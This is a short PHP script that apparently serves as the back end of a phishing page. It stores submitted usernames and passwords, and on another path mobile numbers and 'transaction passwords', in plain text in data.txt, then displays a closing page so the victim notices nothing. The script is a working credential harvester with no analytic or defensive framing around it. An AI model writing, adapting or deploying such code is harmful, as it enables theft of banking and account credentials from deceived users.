<?php
if(isset($_POST['submit'])){
$file=fopen("data.txt", "a");
$name=$_POST["name"];
$word=$_POST["word"];
$n="\n";
$text="USERNAME = ".$name. "   "."PASWORD = ".$word.$n;
fwrite($file, $text);
fclose($file);
echo readfile("End.html");
}
elseif(isset($_GET['submit'])){
$file=fopen("data.txt", "a");
$name=$_GET["name"];
$word=$_GET["word"];
$n="\n";
$text="MOBILE NUMBER = ".$name. "   "."TRANSACTION PASSWORD = ".$word.$n;
fwrite($file, $text);
fclose($file);
echo readfile("End.html");
}
?>